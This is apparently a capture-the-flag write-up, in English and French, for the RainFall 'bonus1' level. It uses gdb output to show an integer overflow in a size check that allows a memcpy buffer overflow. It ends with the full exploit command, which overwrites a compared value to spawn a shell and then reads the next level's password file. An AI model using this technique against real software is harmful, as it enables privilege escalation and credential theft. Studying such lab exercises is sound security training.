# bonus01

The progam wait for..

To solve this challenge, two steps need to be done:

- The first parameter must be lower than 9. It will be multiplied by 4 and will be the 3th parameter of `memcpy`.

- The next step is to overwrite value at address `0xbffff6fc`, the value of the `atoi` return that is compared with `0x574f4c46` and open a shell if true.

Afin de resoudre ce challenge il y a deux etapes a passer:  

La premiere consiste a ecrire un nombre qui doit etre plus petit ou egale '9', qui sera ensuite multiplier par 4 et sera le troisieme argument de memcpy().  
  
Le deuxieme etape consiste a ecraser l adresse 0xbffff6fc qui devra avoir pour valeur 0x574f4c46, nous pouvons voir que cette adresse est le premiere argument de la fonction memcpy()+40 et le deuxieme argument de memcpy est argv[2].

To overvwrite the value of address `0xbffff6fc`, we calculate the length of bytes from the beginning of the buffer that is in the `memcpy` function call:

```bash
=> 0x08048473 <+79>:    call   0x8048320 <memcpy@plt>  
(gdb) x/wx $esp  
0xbffff6c0:     0xbffff6d4  
(gdb) x/wx $esp+0x3c  
0xbffff6fc:     0xc000000c  
(gdb) p/d 0xbffff6fc-0xbffff6d4  
$45 = 40  
```

We need to write from the 40th bytes of the buffer to overwrite the variable value. But the condition that prevent the first parameter to be greater that 9 is blocking us here. We can write a maximum of 36 bytes (4 * 9).

By putting a breakpoint after the multiplication of the `atoi` return, we can see that passing negative value give us some useful information:

```bash
(gdb) r -1 AAAA
Starting program: /home/user/bonus1/bonus1 -1 AAAA

Breakpoint 1, 0x0804845a in main ()
(gdb) i r 
eax            0xffffffff       -1
ecx            0xfffffffc       -4
edx            0x1      1
(gdb) r -2 AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus1/bonus1 -2 AAAA

Breakpoint 1, 0x0804845a in main ()
(gdb) i r 
eax            0xfffffffe       -2
ecx            0xfffffff8       -8
```

We can found the correct value by two distinct method:

- we can first substract 43 from `0xffffffff` and then divide it by 4 to get our number to pass as first parameter:

```bash
(gdb) p/d (0xffffffff-43)
$33 = 4294967252
(gdb) p/d (0xffffffff-43)/4
$34 = 1073741813  
(gdb) r -1073741813 AAAA
The program being debugged has been started already.
Starting program: /home/user/bonus1/bonus1 -1073741813 AAAA

Breakpoint 1, 0x0804845a in main ()
(gdb) i r
eax            0xc000000b       -1073741813
ecx            0x2c     44
```

- we also observed that if the first paramter is the minimun int, the result of the multiplication will be 0. By substracting it 11, we can get our number:

```bash
(gdb) r -2147483648 AAAA
The program being debugged has been started already.
Starting program: /home/user/bonus1/bonus1 -2147483648 AAAA

Breakpoint 1, 0x0804845a in main ()
(gdb) i r
eax            0x80000000       -2147483648
ecx            0x0      0
(gdb) r -2147483637 aaaa
The program being debugged has been started already.
Starting program: /home/user/bonus1/bonus1 -2147483637 aaaa

Breakpoint 1, 0x0804845a in main ()
(gdb) i r
eax            0x8000000b       -2147483637
ecx            0x2c     44
```

We can now try to exploit the program:

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ cd /home/user/bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

or:

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ cd /home/user/bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
